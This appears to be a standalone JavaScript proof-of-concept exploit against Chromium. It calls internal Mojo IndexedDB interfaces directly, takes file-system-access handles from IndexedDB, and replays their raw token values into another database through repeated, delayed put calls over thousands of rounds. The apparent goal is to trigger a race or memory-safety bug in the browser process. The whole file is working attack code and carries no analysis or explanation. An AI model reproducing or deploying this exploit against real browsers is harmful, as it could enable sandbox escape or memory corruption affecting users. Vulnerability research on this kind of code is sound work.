(() => {
  "use strict";
  var N = 4;
  var M = N + 4;
  var sleep = (ms) => new Promise((resolve) => setTimeout(resolve, ms));
  var reqPromisify = (req, onupgradeneeded = null) => new Promise((resolve, reject) => {
    if (onupgradeneeded == null) {
      onupgradeneeded = function(ev) {
        reject(ev);
      };
    }
    req.onsuccess = function(ev) {
      resolve(this.result);
    };
    req.onerror = function(ev) {
      reject(ev);
    };
    req.onupgradeneeded = onupgradeneeded;
  });
  function idGenerator(start = 0) {
    let id = start;
    return () => {
      return id++;
    };
  }
  var toString16 = (string) => new mojoBase.mojom.String16({ data: Array.from(string).map((c) => c.charCodeAt(0)) });
  var fromString16 = (ms) => ms.data.map((n) => String.fromCharCode(n)).join("");
  var getIDBFactory = (() => {
    let factory = null;
    return () => {
      if (!factory) {
        factory = new blink.mojom.IDBFactory.ptrClass();
        Mojo.bindInterface(blink.mojom.IDBFactory.name, mojo.makeRequest(factory).handle);
      }
      return factory;
    };
  })();
  var openDatabase = async (name, version) => {
    const dbCallback = (() => {
      const ptrInfo = new mojo.AssociatedInterfacePtrInfo();
      const req = mojo.makeRequest(ptrInfo);
      const handlers = {};
      const binding = new mojo.AssociatedBinding(blink.mojom.IDBDatabaseCallbacks, handlers, req);
      return { ptrInfo, handlers };
    })();
    const tx = createTransaction(null, [], blink.mojom.IDBTransactionMode.ReadWrite);
    const txCallback = (() => {
      const ptrInfo = new mojo.AssociatedInterfacePtrInfo();
      const req = mojo.makeRequest(ptrInfo);
      const handlers = {};
      const binding = new mojo.AssociatedBinding(blink.mojom.IDBCallbacks, handlers, req);
      return { ptrInfo, handlers };
    })();
    txCallback["upgradeNeeded"] = function() {
      throw Error("upgrade required");
    };
    const p = new Promise((resolve) => {
      txCallback.handlers["successDatabase"] = function(ptr, metaData) {
        resolve([ptr, metaData]);
      };
    });
    getIDBFactory().open(txCallback.ptrInfo, dbCallback.ptrInfo, toString16(name), version, tx.req, void 0);
    {
      const [ptr, metaData] = await p;
      return {
        ptr: new blink.mojom.IDBDatabaseAssociatedPtr(ptr),
        md: metaData
      };
    }
  };
  var newTransactionId = idGenerator(1);
  var createTransaction = (databasePtr, objectStoreIdList, transactionMode) => {
    const ptrInfo = new mojo.AssociatedInterfacePtrInfo();
    const req = mojo.makeRequest(ptrInfo);
    const ptr = new blink.mojom.IDBTransactionAssociatedPtr(ptrInfo);
    const id = newTransactionId();
    if (databasePtr) {
      databasePtr.createTransaction(req, id, objectStoreIdList, transactionMode, blink.mojom.IDBTransactionDurability.Default);
    }
    return {
      ptrInfo,
      req,
      ptr,
      id
    };
  };
  var VALUE_DB_NAME = "valuedb";
  var VALUE_DB_STORE_NAME = "vstore1";
  var EXPLOIT_DB_NAME = "pocdb";
  var EXPLOIT_DB_STORE_NAME = "xstore1";
  var getFileTokenValue = async (ids) => {
    const db = await openDatabase(VALUE_DB_NAME, 1);
    const os = Array.from(db.md.objectStores.values()).find((os2) => {
      return fromString16(os2.name) === VALUE_DB_STORE_NAME;
    });
    if (!os)
      throw Error("No os");
    const tx = createTransaction(db.ptr, [os.id], blink.mojom.IDBTransactionMode.ReadOnly);
    const data = await Promise.all(ids.map((id) => {
      const kr = new blink.mojom.IDBKeyRange({
        lower: new blink.mojom.IDBKey({ string: toString16(id) }),
        upper: new blink.mojom.IDBKey({ string: toString16(id) }),
        lowerOpen: false,
        upperOpen: false
      });
      return db.ptr.get(tx.id, os.id, -1, kr, false);
    }));
    db.ptr.close();
    return data;
  };
  var prepareFileHandle = async (num) => {
    const dbPromise = (async () => {
      await reqPromisify(indexedDB.deleteDatabase(VALUE_DB_NAME));
      return await reqPromisify(indexedDB.open(VALUE_DB_NAME, 1), function(ev) {
        const db2 = this.result;
        db2.createObjectStore(VALUE_DB_STORE_NAME, { keyPath: "id" });
      });
    })();
    const [fileHandle] = await window.showOpenFilePicker();
    const db = await dbPromise;
    const tx = db.transaction([VALUE_DB_STORE_NAME], "readwrite");
    const store = tx.objectStore(VALUE_DB_STORE_NAME);
    let ids = [];
    for (let i = 0; i < num; ++i) {
      const id = `file${i}`;
      store.put({
        "id": id,
        "value": fileHandle
      });
      ids.push(id);
    }
    await new Promise((resolve, reject) => {
      tx.commit();
      tx.oncomplete = () => {
        resolve();
      };
      tx.onerror = (err) => {
        reject(err);
      };
    });
    db.close();
    return ids;
  };
  var poc = async (round, valueEx) => {
    if (round === 0) {
      await reqPromisify(indexedDB.deleteDatabase(EXPLOIT_DB_NAME));
      (await reqPromisify(indexedDB.open(EXPLOIT_DB_NAME, 1), function() {
        const db2 = this.result;
        const store = db2.createObjectStore(EXPLOIT_DB_STORE_NAME, {
          keyPath: "id"
        });
      })).close();
    }
    const db = await openDatabase(EXPLOIT_DB_NAME, 1);
    const os = Array.from(db.md.objectStores.values()).find((os2) => fromString16(os2.name) === EXPLOIT_DB_STORE_NAME);
    const tx = createTransaction(db.ptr, [os.id], blink.mojom.IDBTransactionMode.ReadWrite);
    tx.ptr.commit(0);
    for (let i = 0; i < N; ++i) {
      const key = new blink.mojom.IDBKey({ string: toString16(`ID_F${i}`) });
      tx.ptr.put(os.id, valueEx[i].result.$data.value, key, blink.mojom.IDBPutMode.AddOrUpdate, []);
    }
    const txPromise = tx.ptr.commit(0);
    {
      const key = new blink.mojom.IDBKey({ string: toString16(`ID_F${N - 1}`) });
      for (let i = N; i < M; ++i) {
        tx.ptr.put(os.id, valueEx[i].result.$data.value, key, blink.mojom.IDBPutMode.AddOrUpdate, []);
        await sleep(0);
      }
    }
    await txPromise;
    db.ptr.close();
  };
  var main = () => {
    console.log("Mojo:", typeof mojo);
    console.log("Press [Choose File] button!");
    document.getElementById("start_button").addEventListener("click", async function() {
      const ids = await prepareFileHandle(M);
      for (let i = 0; i < 1e4; ++i) {
        console.log("ROUND", i);
        this.textContent = `ROUND ${i}`;
        const t = await getFileTokenValue(ids);
        await poc(i, t);
      }
    }, { once: true });
  };
  if (document.readyState === "interactive") {
    main();
  } else {
    document.addEventListener("DOMContentLoaded", main, { once: true });
  }
})();
